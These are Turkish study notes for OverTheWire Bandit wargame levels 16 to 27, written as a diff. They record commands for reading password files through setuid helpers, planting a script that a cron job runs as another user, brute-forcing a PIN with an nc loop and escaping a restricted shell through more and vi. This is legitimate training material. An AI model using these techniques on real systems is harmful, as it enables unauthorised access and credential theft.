+ve SERVICE sütununun altında hepsinde unknown yazıyor bu sütunun altında ne gibi bir bilgi veriliyor araştır buraya yaz 
+
+ncat -ssl localhost 31046 şeklinde sırayla ilgili portları bu komutta sadece port numarasını değiştirerek deniyoruz (çünkü hangisi olduğunu bulmak için 
+bunu yapmamız gerekiyor? e peki tek bir komutta bu port numaralarını belirtip ilgili flagi bu port numaralarına tek bir komutta göndersek? 
+böyle bir parametre veya seçenek var mı araştır buraya yaz)
+
+yine aynı mantıkla 
+
+ncat -ssl localhost 31046 çalıştır yeni bir satıra geçince bandit16 nın flagini ver ve  bu işlemi çıktıdaki bütün portlar için tekrarla 
+
+ve gördüğümüzde ncat --ssl localhost 31790 çalıştırdığımızda 
+
+bize BEGIN RSA PRIVATE KEY başlığı altında uzuuuun ca bir key verdi 
+
+bu metnin 
+
+BEGIN RSA PRIVATE KEY yazan satırın en başından END RSA PRIVATE KEY yazan satırın en sonuna kadar kopyalıyoruz 
+
+rsa, rsa private key ve bu ikisinin ssl encryption ve ssl serfikası ile bağlantısı nedir bunu araştır buraya yaz 
+
+bu uygulamadaki rsa private key = ssh private key mi araştır buraya yaz 
+
+ardından exit diyerek çıkıyoruz  ardından terminnalde bulunduğumuz dizinde örneğin /tmp , nano privatekey17 çalıştırarak yeni bir dökuman oluşturuyoruz 
+
+ardıdan sağ tık paste clipboard veya paste selection (shift+ins) diyerek kopyaladığımız rsa rpivate keyini buraya yapıştırıyoruz 
+
+ardından ctrl+o tuşlarına basarak kaydediyoruz ve ctrl+x diyerek bu dökumandan çıkıyoruz 
+
+ardından ssh -i privatekey17 bandit16@bandit.labs.overthewire.org -p 2220 çalıştırıyoruz 
+
+daha sonra privatekey17 dosyasının izinlerinin 644 olduğunu ve bu izinlerin bu dosya için çok açık (open) / fazla (gereksiz şekilde fazla yetkiye sahip olduğunu söylüyor)
+
+ve bu dosyanın izinlerini düşürmemizi istiyor 
+
+chmod 400 privatekey17 çalıştırarak privatekey17 dosyamızın izinlerini değiştiriyoruz (400 izininin ne anlama geldiğini arşatır buraya yaz)
+ ardından ssh -i privatekey17 bandit16@bandit.labs.overthewire.org -p 2220 çalıştırıyoruz ve bandit17 ye başarıyla giriş yaptığımızı görebiliyoruz 
+
+
+ cat /etc/bandit_pass/bandit17 çalıştırırsak bandit17 kullanıcısına 
+
+ ssh bandit17@bandit.labs.overthewire.org -p 2220 şeklinde giriş yapmak istediğimizde girebileceğimiz flag i terminale bastırmış oluruz bunu 
+
+ da kopyalayıp şifreler dosyamıza kaydedebiliriz (/etc/bandit_pass dizininde bütün kullanıcıların flagleri bulunur bazılarını okumaya iznimiz yoktur 
+ yani bizdek yukarıdakilerini ama bazılarını da okuyabiliriz [bizden aşağıdaki kullanıcıları])
+
+bandit17 kullanıcısının home dizininde 2 adet dosya olduğunu görüyoruz 
+
+passwords.old ve passwords.new bu dosyalarda sadece bir satır değiştirilmiş ve 1 satır haricinde 2 dosya da tamamen aynı verilere sahip 
+
+bizden bu değiştiirlmiş satırı bulmamızı ve bu satırın da flag olduğunu söylüyor 2 dosya arasındaki farklı satırı / veriyi bulmak için 
+
+diff isimli bir tool u kullanabiliriz 
+
+diff passwords.new passwords.old çalıştırdığımızda adet flag çıktısı alırız bir tanesi 
+
+< flag formatında diğeri de > flag formatında biz komutu çalıştırırken önce password.new i yazdığımız için ilk flag yani üstteki 
+
+passwords.new dosyasındaki değiştirilen / farklı olan flagdir bunu kopyalıyoruz (< karakterini kopyalamıyoruz sadece flag metnini)
+
+(her aşamada flagimizi şifrler dosyasına kaydedelim bağlantı koparsa hızlı bir şekilde aynı şifreyle giriş yapmak için)
+
+daha sonra ssh bandit18@bandit.labs.overthewire.org -p 2220 çalıştırıp ardından flag i girip giriş yapalım
+
+ve başarıyla giriş yaptığımızı görüyoruz ancak daha sonra Byebye! diyerek bağlantımızı sonlandırdı bu seviyenin sitedeki açıklamasına baktığımızda 
+
+bunun normal olduğunu söylüyor bu atma işleminin bandit19 la ilgili olduğunu söylüyor bu yüzden bandit18 --> bandit29 
+
+kısmına tıklayalım sitede bu açıklamada bandit18 in içerisine ssh ile girersen atılırsın diyor ama istediğimiz flag yani 
+
+bandit19 un flagi bandit18 kullanıcısının home dizininde, bu seviyeyi çözmemiz için bize yardımcı olacak komuzlar arasında da ssh var 
+
+demek ki biz ssh ın farklı bir parametresini kullanarak bandit18 e giriş yapmamız gerekiyor 
+
+ve bize sitede ssh ın kullanmış olduğu shell olan .bashrc nin değişitirldiğini bu yüzden bağlantımızın sonlandırıldığını söylüyor (sistemlerde ssh ın kullandığı shell farklılık gösterebilir)
+
+ssh ın kullanmış olduğu shell i değiştirmek için google da change ssh shell sorgusunu çalıştırıp çıkan sonuçları inceleyebiliriz 
+
+https://serverfault.com/questions/106722/choosing-the-shell-that-ssh-uses bu bağlantıda faydalı bilgiler var 
+
+ssh -t bandit18@bandit.labs.overthewire.org -p 2220 '/bin/sh' çalıştırıp bandit18 in flagini girdiğimizde başarıyla bağlandığımızı görüyoruz 
+
+(bu komuttaki -t parametresi ne işe yarıyor araştır buraya yaz '/bin/sh' şeklinde belirttiğimiz kısım da hangi shell(kabuk) versiyonunu 
+kullanmak istediğimizi belirttiğimiz kısımdır zsh,bash,sh gibi farklı shell versiyonları vardır)
+
+whoami çalıştırdığımızda bandit18 çıktısını alıyoruz 
+
+ls çalıştırdığımızda readme iismli bir dosyanın olduğunu görüyoruz daha sonra cat readme çalıştırdığımızda 
+
+bandit19 un flagini görebiliriz bu flagi kopyalıyoruz 
+
+ssh bandit19@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit19 a başarıyla bağlandığımızı görebiliriz 
+
+ls çalıştırdığımızda bandit20-do isimli bir dosyanın olduğunu görüyoruz 
+
+file bandit20-do çalıştırdığımızda çıktıda executable çıktısını alıyoruz bu da demek oluyor ki bu dosya çalıştırılabilir bir dosyadır. 
+
+./bandit20-do çalıştırdığımızda başka bir kullanıcı olarak bir komut çalıştırın çıktısı aldık 
+
+example: ./bandit20-do id şeklinde çalıştırabilirsiniz diyor 
+
+id çalıştırdığımızda mevcut olan kullanıcımızın uid, gid ve groups değerlerini görebiliyoruz bunların ne anlaama geldiğini ve id komutunun hangi bilgileri çıktı olarak verildiğini ne işe yaradığını ve hangi durumlarda kullanıldığını araştır buraya yaz 
+
+bize örnek olarak verdiği şeklde dosyamızı çalıştıralım 
+
+
+./bandit20-do id çalıştırdığımızda az önceki gibi uid, gid, groups değerleri ekrana bastırıldı ancak bu sefer öncekinden farklı olarak 
+
+euid diye bir şey ve değeri de çıktı olarak geldi bunu da araştır buraya yaz 
+
+önceki komutta da burada da ilgili terim ve değeri verildikten sonra parantez içerisinde (bandit19) şeklinde bir ifade var ikinci komutta da 
+bu bu şekilde oldu ancak euid den sonra (bandit20) şeklinde yazıyordu sanırım bundan dolayı bu dosyayı kullanarak banfit19 kullanıcısı ile 
+oturum açmış olmamıza rağmen bandit20 kullanıcısının yetkileriyle bir komut çalıştırıp bir işlem yapabiliriz 
+
+sitesinde 19 dan 20 ye geçerken bandit20 nin şifresinin /etc/bandit_pass/ dizininde bulabilirsin dedi 
+
+şimdi normalde bandit19 olarak bandit20 nin şifresini okuyamadığımız / yetkimizin olmadığı dosyayı bandit20-do dosyası aracılığıyla 
+okuyalım bunun için:
+
+./bandit20-do cat /etc/bandit_pass/bandit20 ardından çıktı olarak gelen flagi kopyalıyoruz 
+
+ssh bandit20@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit20 ye başarıyla bağlandığımızı görebiliriz 
+
+ls -la çalıştırıyoruz 
+
+./suconnect çalıştırdığımızda bir çıktı aldık ama bu çıktıda ne demek istediğini anlamadım sitesinde bu seviyeyi geçmek için brief olarak verilen bilgileri oku ve bu seviyenin nasıl geçildiğini iyi bir şekilde anla 
+
+öncelikle nmap -p- localhost çalıştırarak sistemdeki bütün portları tarayıp açık portları listeliyoruz 
+
+ancak buradaki portları / portlardan değil de kendi seçtiğimiz bir porttan netcat ile dinleme işlemi yapıp başka bir terminal tabından da 
+
+bandit20 ye bağlanalım
+
+nc -l localhost -p 4444 çalıştırarak 4444 portunu dinliyoruz 
+
+ardından yeni bir terminal tabından 
+
+ssh bandit20@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit20 a başarıyla bağlanıyoruz daha sonra 
+
+./suconnect 4444 çalıştırıyoruz ve kendi dinlemiş olduğumuz porta başka bir oturumdan bağlanıyoruz   
+
+ardından bandit20 nin flagini kopyalayıp ilk açtığımız terminal tabına yapıştırıp enterlıyoruz ve bize bir flag verdi muhtemelen bu bandit21 in 
+fliagi bu flagi kopyalıyoruz 
+
+ssh bandit21@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit21 a başarıyla bağlandığımızı görebiliriz 
+
+bu uygulamamızda cron isimli bir komutu kullanalım 
+
+cron işi olarak da bilinen yazılım yardımcı programı cron, Unix benzeri bilgisayar işletim sistemlerinde zamana dayalı bir iş zamanlayıcıdır. 
+Yazılım ortamlarını kuran ve bakımını yapan kullanıcılar,
+ işleri sabit zamanlarda, tarihlerde veya aralıklarla periyodik olarak çalışacak şekilde planlamak için cron'u kullanır.
+
+ cron, bilgisayarda belli aralıklarla şunu çalıştır, beli aralıklarla bunu yap dediğimiz / diyebildiğimiz bir komuttur 
+
+ örneğin arkaplan da her 5dk da bir şu komutu çalıştır her 15 dakika da bir abc.coom a git demek gibi bir şey 
+
+ ce /etc/cron.d > ls -la çalıştırıyoruz ve burada cronjob isminde dosyalar var bu dosyaların içeriklerini okuyarak hangi işlemi gerçekleştirmek istediğini görebiliriz / okuyabiliriz 
+
+ örneğin: cat cronjob_bandit15_root çalıştırdığımızda root /usr/bin/cronjob_bandit15_root.sh &> /dev/null şeklinde bir çıktı aldık çıktının başındaki root 
+ ne anlama geliyor araştır buraya yaz (muhtemelen ilgili cronjob ın hangi kullanıcı tarafından oluşturulduğunu ifade ediyor ama tam emin değilim)
+
+ yani bandit_15_root cronjob ı /usr/bin/cronjob_bandit15_root.sh dizinindeki bir bash script i çalıştırıyormuş 
+
+ komuttaki &> /dev/null ifadesi ne anlama geliyor bunu araştır buraya yaz 
+
+bizim burada ilgilendiğimiz cronjob cronjob_bandit22 dir çünkü bandit22 kullanıcısının flagini almak istiyoruz 
+
+bu yüzden cat cronjob bandit22 çalıştırıyoruz ve 
+
+/usr/bin/cronjob_bandit22.sh dizinindeki bash scripti çalıştıracağını görüyoruz 
+
+daha sonra cat /usr/bin/cronjob_bandit22.sh çalıştırdığımızda 
+
+chmod 644 /tmp/t706-ve-uzunca-bir-metin (bu komut satırı, /tmp/t706-ve-uzunca-bir-metin dizinindeki dosyanın izinlerini 644 olarak değiştirilmesi için yazılan bir satır
+bu işe yarıyor yani ama neden izinlerini bu şekilde değiştirsin ki önceki izin numarası neydi buna bak ve neden böyle bir izin değişikliği yapmak istediğğinin sbeebini buraya yaz)
+
+ardından bu satırın bir alt satırında 
+
+cat /etc/bandit_pass/bandit22 > /tmp/t706-ve-uzunca-bir-metin satırı var bu da bandit22 isimli bandit22 nin flagini içeren dosyanın içeriğini 
+/tmp/t706-ve-uzunca-bir-metin dizinindeki dosyanın içerisine yönlendiriyor 
+
+biz de cat /tmp/t706-ve-uzunca-bir-metin çalıştırırsak bandit22 nin flagini alabiliriz 
+ 
+
+exit > ssh bandit22@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit22 a başarıyla bağlandığımızı görebiliriz 
+
+bu seviyemizde cron ile ilgili bu yüzden 
+
+cd /etc/cron.d > ls -la çalıştırıyoruz 
+
+ardından cat cronjob bandit23 çalıtırıyoruz gelen çıktıda bandit23 ün /usr/bin/cronjob_bandit23.sh ı çalıştırdığını görüyoruz 
+
+
+bu yüzden; cat /usr/bin/cronjob_bandit23.sh çalıştırıyoruz 
+
+gelen çıktının ilk satırında 
+
+myname=$(whoami) var bu komut, myname isminde bir değişken tanımlanıp whoami komutunun çıktısını -yani çalıştırdığıımzda sisteme hangi kullanıcı ile 
+giriş yaptığımızı yazdıran komut- bir ortak değişkeni olarak myname simli değişkene değer olarak atanıyor 
+
+(burada neden $ kullandığını anlamadım acaba whoami tek başına yazıldığında string olarak algılanıp $() şeklinde parantez içine yazıldığında 
+bunun bir komut oldu algılanıp komut çalıştırılıp çıktısı da myname isimli dğeişkene mi değer olarak atanıyor bunu araştır buraya yaz)
+
+bir altındaki satırda 
+
+mytarget=$(echo I am  user $myname | md5sum | cut -d ' ' -f 1) yazıyor bu yine mytarget isimli bir değişken oluşturulmuş ve bu değişkeninin 
+içerisine [buradan sonrası için tam emin değilim bunu araştır doğrula buraya yaz] echo diyerek bundan sonra gelen stringleri yazdıracak 
+/burada echo komutu çalıştırılacak mı yoksa normal bir string mi? I am user (yani ben ... kullanıcısıyım) ardından $myname geliyor ve bu myname dğeişkeninin 
+değeri bandit23 olduğu için (yani bu işlemler bandit22 tarafında değil bandit23 için yapılıyor) diyerek ... kısmı bandit23 şeklinde tamamlanıyor.
+ardından grep kullanılarak I am user bandit23 stringinin / stringi md5 ile hashleniyor? /bundan da tam emin değilim daha sonra
+
+tekrar grep kullanılıyor ve bu hash cut -d ' ' -f 1 komutu ile formatlanıyor ama bu komut nasıl bir şekilde formatlıyor onu anlamadım 
+(hoca videoda bundan bahsetmedi) /bunu araştır buraya yaz [formatlanmadan önceki ve formatlandıktan sonraki halini buraya koy!!!]
+
+ardından bir alt satırda:
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget" satırında (biraz sonra yazacaklarımdan da tam emin değilim araştırıp hepsini doğrula)
+
+echo ile terminale bastırma komutunu kullanmış daha sonra Copying file (yani bir üst satırda oluşturulmuş ve formatlanmış hash yani bandit23 ün flagi 
+/ flag metni bu komut satırını anlamadım araştırıp tamamını detaylı sade bir şekilde yaz ama bence yukarıdaki bütün metin tırnak işareti içerisinde 
+olduu için bilgilendirme amacı için şifredosyası /tmp/$mytarget a olacak bu yüzden cd /tmp/ çalıştırıp ardından $mytarget yaz ve flag yani $mytarget
+isimli ortam değişkenin değeri olan bandit23 ün şifresi ekrana bastırılsın demek istmeiş yani yukarıdaki satırda çalıştırılan tek komut echo)
+
+ardından bir alt satırda 
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget bu satırı da hiç anlamadım  burada nedne bir yönlendirilme yapılsın ki amaç ne araştır buraya yaz !!! 
+
+terminalimizde /etc/cron.d dizinindeyken myname=bandit23 (arada hiç boşluk bırakmadan çalıştırmamız gerekiyor) yazarak bandit23 myname değişkenini bandit23 stringine eşitliyoruz ki 
+
+bu bir tetikleme aktivitesi olacak çünkü eğer böyle bir ortam değişkeni mevcut olursa yani $myname isimli ortam değişkeninin değeri ancak bandit23
+stringi olursa yukarıdaki tüm işlemler gerçekleşebileceği için bu işlemleri tetiklemek için böyle yaptık 
+
+ardından echo I am  user $myname | md5sum | cut -d ' ' -f 1 çalıştırıyoruz ve bize bir metin veriyor bu şifremizin hangi dosya ismine kaydedildiğini 
+gösteriyor bu metni kopyalıyoruz
+
+ardından cat /tmp/kopyaladıgımız-metin çalıştırdığımızda bize bandit23 in flagini veriyor bu flagi kopyalıyoruz
+
+şimdi anladım mytarget = kopyaladıgımız-metin olduğu ve 
+
+kopyalanan bu metin de cat /etc/bandit_pass/$myname > /tmp/$mytarget komutu ile /tmp/kopyalanan-metin-sifre-dosyası-yapıldı 
+
+exit > ssh bandit23@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit23 a başarıyla bağlandığımızı görebiliriz 
+
+bu seviyede de cron ile ilgili bazı işlemler yapıyoruz ama bu seviyedeki işlemlerimiz biraz ileri seviye cron işlemleri 
+
+cd /etc/cron.d > ls -la > cat cronjob_bandit24 çalıştırıyoruz 
+
+gelen çıktıda bu cron un /usr/bin/cronjob_bandit24.sh isimli bash scripti çalıştırdığını görüyoruz 
+
+ardından cat /usr/bin/cronjob_bandit24.sh çalıtırıyoruz 
+
+şimdi ilgili bash scriptimizi inceleyelim: 
+
+#!/bin/bash ---> bu komut ilgili dosyanın içerisindeki komutların bir bash script olduğunu tanımlamak içindir html deki <! Doctype HTML> gibi 
+
+ardından myname = $(whoami) bu komut satırının ne anlama geldiğini zaten biliyoruz 
+
+ardından cd /var/spool/$myname ilgili dizinde $myname ortam değişkenini çağırarak ekrana bandit24 yazırıyor (şuandaki kullanıcımız bandit23 olsa da ilgili bash script bandit24 hakkında çünkü bizim geçmek istediğimiz kullanıcı bandit24)
+
+örneğin biz başka bir terminal tabında 
+
+cd /var/spool/bandit24 çalıştırıyoruz ardından ls -la çalıştırdığımızda permission denied hatası alıyoruz çünkü bu komutu çalıştırma iznimiz yok bu 
+dizinde 
+
+ardından bu terminali kapatarak /etc/cron.d de olduğumuz terminale geri dönüyoruz ve bash scriptimizin bir alt satırında 
+
+echo "Executing and deleting all scripts in /var/spool/$myname:" isimli bir satır olduğunu görüyoruz bu satırın anlamı:
+
+/var/spool/bandit24 dizinindeki bütün scriptleri (burada sadece bash scriptleri mi kastedilmiş yoksa başka scriptler de mi var)
+
+önce çalıştırıp ondan sonra sileceğini söylüyor şimdi bir alt satırdkai koda bakalım 
+
+for i in * .*; bu satır * .* yani /var/spool/bandit24 deki bütün dosyaları (linux da dizinler " / " karakteri ile, dosyalar da " . " karakteri ile 
+
+gösterilirler ama burada noktadan önce ve sonra neden * (yıldız) karakteri kullandığını anlamadım * karakteri linuxdaki ilgili kavram ile ilgili HER ŞEYİ 
+seç / getir gibi anlamlara geliyor ama öncesine ve sonrasına yani her iki tarafına neden koymu onu anlaamdım bunu araştır buraya yaz)
+
+yani bütün dosyaları (dosya isimlerini mi ? yoksa dosyaların binary vs vb kodlarını mı i değişkeninin içerisine değer olarak atıyor bunu araştır buraya yaz)
+
+for i in * .*;  satırı ile bir for döngüsüne başlanmış oluyor 
+
+ardından 
+
+do 
+
+
+
+
+done 
+
+arasındaki başla ve bitir işeklinde, üstteki for döngüsünün kapsamı belirtiliyor 
+
+ardından if kontrolü başlıyor 
+
+if [ "i" != "." -a "$i" != ".."];
+then (then komutu bash scripti çalıştırmaya bir alt satırdan devam et gibi bir anlama mı geliyor araştır buraya yaz)
+
+ bu satırda sanırım daha sonra bu dizinde bir dosya veya dizin oluşturulup oluşturulan bu yeni dizinin içerisine 
+dosyalar oluşturulursa bunu kontrol edip aynı işlemi bu yeni oluşturulan dosya ve dizinlere de uygulamak için böyle bir kod yazılmış (bundan tam emin değilim araştır buraya yaz doğrula)
+
+echo "HandLing $i" burada $i ortam değişkeni işleniyor / ele alınıyor yazısını terminale bastırıyor daha sonra 
+
+owner="$(stat --format "%U" ./$i)" bu komutta ne yapmak istediğini anlamadım 
+
+ama ilgili dosyaların (bütün dosyların mı?) sahiplerini buluyor ardından 
+
+if [ "${owner}" = "bandit23" ]; then ve bu dosyanın / dosyaların sahibi bandit23 ise yani ilgili dosya / dosyalardan sahipliği bandit23 olan dosyaların 
+
+    timeout -s 9 60 ./$i (eğer ilgili dosyanın sahibi bandit23 ise) [çünkü biz şuan bandit23 üz] 60 saniyede bir yani dakikada bir ./$i ortam değişkenini çalıştırıyor 
+(üstteki komutta -s 9 komutu ne işe yarıyor bunu araştır buraya yaz)
+    fi (bash scriptte if kontrolü fi yazarak bitirilir. ) ardından da 
+
+    rm -f ./$i ($i dosyasını siliyor ($i ortam değişkenini tamamen sistemden mi siliyor yoksa ilgili dizindeki $i ortam değişkenini mi siliyor))
+
+fi 
+
+yani kısaca /var/spool/bandit24 dizini içerisinde bandit23 kullanıcısı tarafından oluşturulmuş bir dosya veya dizin varsa bunu 60 saniyede bir siliyor 
+  
+(yani ilgili kontrolleri 60 saniyede bir tekrarlayarak bu şekilde bir dosya veya dizin varsa bunları siliyor)
+
+peki biz burada ne yapabiliriz 
+
+bandit in sitesinde bu seviyenin açıklamasında bizden kendi bash scriptimizi yazmamızı istiyor çünkü; 
+
+biz bandit23 üz eğer bir bash script yazıp bu /var/spool/$myname in içerisine (/bandit24 ün içerisine) koymayı başarırsak 
+
+o zaman bandit23 olarak yazdığımız shell scripti (shell script = bash script diye biliriz tam olarak öyle değil çünkü bash bir shell versiyonu  ama kısmen doğru)
+
+bandit24 kullanıcısı olarak çalıştırtabiliriz ve çalıştırttıktan sonra da bandit24 ün şifresini alabiliriz.
+
+cd /tmp çalıştırıyoruz ve ls çalıştırdığımızda permission denied hatası alıyoruz 
+
+burada mkdir ile bir klasör oluşturaibliyoruz ancak nano ile bir dosya oluşturmamıza izin vermiyor yetkimiz olmadığı için 
+
+mkdir atil123 > xd atil123 yapıyoruz ardından echo "cat /etc/bandit_pass/bandit24 > /tmp/atil123/password.txt" > myscript.sh çalıştırıyoruz 
+
+ardından cat myscript.sh çalıştrdığımızda cat /etc/bandit_pass/bandit24 > /tmp/atil123/password.txt çıktısını alıyoruz bu komut bir shell script 
+dosyasının içerisinde olduğu için bu dosyayı /var/spool/bandit2 ün içerisine atarsak 60 saniye sonra myscript.sh ımız çalışacağı ve haliyle içindeki koda göre 
+
+/etc/bandit_pass/bandit24 dosyasının içeriği okunup bu içerikteki flag yani bandit24 ün şifresi /tmp/atil123/password.txt dosyamıza yönlendirilir 
+
+ancak bunu yapmadan önce chmod 777 myscript.sh çalıştırıyoruz ki dosyamıza yönlendirme yapılacağı zaman izin sıkıntısı olmasın 
+
+bir de şuan /tmp dizininin içerisinde password.txt isimli bir dosyamız yok; touch password.txt > chmod 777 password.txt çalıştırıyoruz 
+
+şimdi de, cp myscript.sh /var/spool/bandit24 çalıştırarak myscript.sh ımızı ilgili dizine kopyalıyoruz 6* saniye geçtikten sonra 
+
+cat password.txt çalıştırıyoruz ve yazdırılan flagi kopyalıyoruz 
+
+exit > ssh bandit24@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit24 a başarıyla bağlandığımızı görebiliriz 
+
+
+
+bu seviyemizde bizden nc localhost 30002 çalıştırarak bandit24 ün şifresi ve 4 haneli bir pin kodunu vermemizi istiyor 
+
+bandit24 ün şifresini zaten biliyoruz ancak 4 haneli pinlerin matematiksel olarak aralığı 1000-9999 olduğu için çok fazla sayı var 
+
+eğer terminalde python çalıtırdıktan sonra çıktı olarak python un versiyon bilgisini alıyorsak ilgili sistemde python yüklüdür demektir.
+
+cd /tmp > mkdir atil24 > cd atil24 ve yine nano ile bir dosya oluşturamıyoruz yni nano xxx.sh çalıştırdığımızda permisison denied hatası alıyoruz. 
+
+vim çözüm.sh çalıştırıyoruz (vim de nano gibi bir text editörüdür) vim de 2 adet mod vardır birisi yazı modu diğeri de komut modu
+
+yazı moduna geçmek için i tuşuna basıyoruz. i ye basıca vim in en sol altında INSERT yani yazı moduna geçilidği yazıyor 
+
+#!/bin/bash 
+
+bandit24password=bandit24-ün-flagi
+
+
+(şimdi bu komutları kaydedebiliyor muyuz bunu deneyelim komut moduna geçmek için escape yani esc tuşuna basıyoruz; basınca sol alttaki INSERT 
+yazısının gittiğini görebiliriz ardından :wq yazıyoruz bu yazılar vim in sol altında gözükmesi gerekiyor. : bu karakter bir komutu başlatmak / çalıştırmak için,
+wq da yazdığımız bir komutu kaydedip çıkmak için yani w = write /yaz /kaydet , q = quit / çık demek)
+
+ardından entera basıp çıkıyoruz cat çözüm.sh çalıştırdığımızda yazdığımız komutların kaydedildiğini görebiliriz.
+
+ardından bash scriptimizi düzenlemeye geri dönelim 
+
+vim çözüm.sh çalıştırıyoruz 
+
+#!/bin/bash 
+
+bandit24password=bandit24-ün-flagi
+
+for i in {1111..9999}; do
+    echo "$bandit24password $i"
+done | nc localhost 30002
+
+komutunu vim e yazıyoruz bu komutta bir for döngüsü oluşturarak 1111 ile 9999 rasındaki bütün sayıları (neden 1000 değil hoca yanlış mı yazmış araştır buraya yaz)
+
+i isimli bir değişkenin içerisine kaydediyoruz daha sonra $bandit24 ve $i değişkenlerini sürekli ekrana bastırıyoruz ki bu da bizden bandit24 flagini ve 
+
+4 haneli pin i tek bir komut satırında istediği için bu yaptıklarımızı da pipe ile bağlayıp nc localhost 30002 komutunu çalıştırdıktan sonra 
+
+yapmamızı sağlıyoruz çünkü önce nc localhost 30002 çalıştırmamız gerekiyor daha sonra flag ve pin girmemiz egrekiyor 
+
+ardından esc > :wq yazıp enterlıyoruz
+
+daha sonra chmod 777 çözüm.sh çalıştırıyoruz ve son olarak ./çözüm.sh çalıştırıyoruz ve daha sonra brute-force saldırımız başlıyor ve 
+
+The password is user bandit25 is bandit-25-in-flag-metni
+
+şeklinde bandit25 in flagini alıyoruz daha sonra 
+
+exit > ssh bandit25@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit26 a başarıyla bağlandığımızı görebiliriz 
+
+ls çalıştırdığımızda bandit26.sshkey isimli bir dosyanın olduğunu görüyoruz.
+
+ssh -i bandit26.sshkey bandit26@localhost > yes > çalıştırıyoruz 
+
+bandit26 ya başarıyla bağlanıyoruz ancak connection to localhost closed şeklinde bandit26 kullanıcısına bağlantımızın sonlandığına / kapandığına dair bir çıktı alıyoruz.
+
+bu seviyenin sitesinde verilen ipucuna göre /bin/bash shell versionu ile bu bağlantıyı gerçekleştirirsek otomatik oşaral bağlantımız sonlandırılıyor.
+
+more toolu da cat gibi bir araçtır örneğin more flags.txt çalıştırırsak kaydettiğimiz bütün flagleri terminalde aynı cat komutu ile görüntülediğimiz gibi yazdırabiliriz.
+
+cat den farkı şudur örneğin terminali küçük bir pencerede / normal boyutundan daha da küçülterek kullanıyoruz.
+bu gibi durumda ilgili dosyadaki bütün çıktıyı terminale vermek yerine terminalin boyutu kadar yani okuyabileceğimiz kadarını verir eğer biz devamını okumak istersek ona göre çıktıyı vermeye devam eder.
+
+(entera bastıkça çıktının geri kalanını parça parça terminale yazdırır.)
+
+daha sonra terminali, yan tarfta overthewireçorg u  firefox ile açmış olduğumuz durumda terminalin boyutu,
+kalinin üstteki application bar ın hemen bittiği kısımdan başlayıp Donate! yazısının üst çerçevesine
+
+küçültüyoruz ardından 
+
+ssh -i bandit26.sshkey bandit26@localhost çalıştırıyoruz ardından yes yazıp enterlıyoruz.
+
+
+ardından terminalde --More--(50%) şeklinde bir şey yazıyor -terminalin en altında terminaldeki çıktının devamını okumak için-
+
+bu kısımda v tuşuna basıyoruz vi toolunu çalıştırıyor bizim için daha sonra terminali eski haline getiriyoruz
+
+terminalin sol altına bakarsak vi şu an INSERT modda ardından esc (escape e basıyoruz)
+
+:set shell=/bin/bash yazıp entera basıyoruz (bu şekilde ssh -i ile başlayan komutumuzu bir nevi more ile 
+intercept ederek yarıda kesiyoruz ve üzerinde değişiklikler yaparak /bin/bash shell ini buraya kaydediyoruz)
+
+ardından esc > :shell yazıp enterlarsak terminalde bandit26@bandit şeklinde bandit26 nın shell inin geldiğini 
+göreibliyoruz.
+
+ardından clear diyerek terminalimizi temizliyoruz bu şekilde çözüm üretmemizin sebebi bandit26 ya giriş yaparken /bin/bash shell inin kullanılmasına izin verilmemesi 
+
+daha sonra cat /etc/bandit_pass/bandit26 çalıştırıyoruz ve bandit26 nın flagini alıp şifreler dosyamıza kaydediyoruz.
+
+eğer intercept ettiğimiz terminalde esc > :q! çalıştırırsak bandit25 kullanıcısına geçmiş oluruz ve intercept 
+i kapatmış oluruz. cat /etc/passwd aldığımız çıktıda bandit26:x: satırının en sonunda /usr/bin/showtext isimli 
+bir shell kullanıldığını görüyoruz. 
+
+ardından /usr/bin/showtext çalıştırdığımızda
+
+#!/bin/sh 
+
+export TERM=linux
+
+more ~/text.txt
+exit 0 
+
+şeklinde bir bash script le karşılaşıyoruz 
+
+(buradaki /bin/sh ile showtext aynı şeyler mi sh bu shell versiyonunun kısaltması mı araştır buraya yaz)
+
+
+bu script te export TERM diyerek TERM ismindeki bir çevresel değişkeni dğeiştirerek bunun değerini linux yapıyor  (neden bunu yapıyor bizizm senaryomuzda bunu yapmasının sebebi ve bize dezavantajı nedir araştır buraya yaz.)
+
+daha sonra more toolu ile text.txt yi çalıştırıyor bu da bizim terminalde intercept ettiğimiz çıktıları içeren bir dosya.
+
+biz komutu direkt olarak more kullanmadan yazmamıza rağmen intercept etmemizin sebebi zaten arkaplanda komutları otomatik olarak more ile çalıştırıyor olmasından dolayıymış 
+
+biz more ile ilgili ssh işlemini yarıda bölerek shell versiyonunu değiştirip ondan sonra işlemimize devam ediyoruz.
+
+ssh bandit25@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit26 a başarıyla bağlandığımızı görebiliriz 
+
+daha sonra ls çalıştırıyoruz ve bandit27-do isimli bir dosya olduğunu görüyoruz 
+
+(bu dosya bandit27 kullanıcısının yetkisiyle bir dosya çalıştırabildiğimiz bir uid dir)
+
+./bandit27-do cat /etc/bandit_pass/bandit27 çalıştırdığımızda bandit27 nin flagini alıyoruz ve kaydediyoruz 
+
+ssh bandit27@bandit.labs.overthewire.org -p 2220 çalıştırıp flagi giriyoruz ve bandit27 a başarıyla bağlandığımızı görebiliriz 
+
+vi den çıkmak için esc > q! yazıp enterlıyoruz.
+
+git, bir versiyon kontrol sistemidir git i sadece yazılım geliştirirken değil herhangi bir dökuman yazarken de kullanabilriz. 
+
+örneğin bir kod yazarken kodun sorunsuz olduğunu düşündüğümüz bir yerde checkpoint ini save alarak eğer ileride
+kodda istemediğimiz değişiklikler olursa en son kaldığımız yerden devam etmek için git bize imkan sağlar.
+
+bandit27 kullanıcısıyla giriş yaptıktan sonra terminalde 
+
+mkdir /tmp/atil27 > cd /tmp/atil27 çalıştırıyoruz 
+
